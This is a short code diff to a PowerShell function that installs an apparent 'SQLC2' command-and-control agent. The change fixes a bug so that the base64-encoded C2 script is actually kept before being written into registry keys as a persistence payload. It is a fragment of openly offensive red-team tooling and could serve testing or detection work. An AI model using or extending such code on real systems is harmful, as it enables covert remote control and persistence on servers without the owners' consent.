@@ -848,7 +848,7 @@ Function Install-SQLC2AgentPs
             $psscript = "$psscript `n`n $SQLC2Command"
 
             # Encode command          
-            $psscript64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psscript)) | Out-Null
+            $psscript64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psscript)) 
 
             # Write command to the registry and drop IoCs
             Write-Verbose " - Attempting to write SQLC2AgentPS payload to registry keys." 
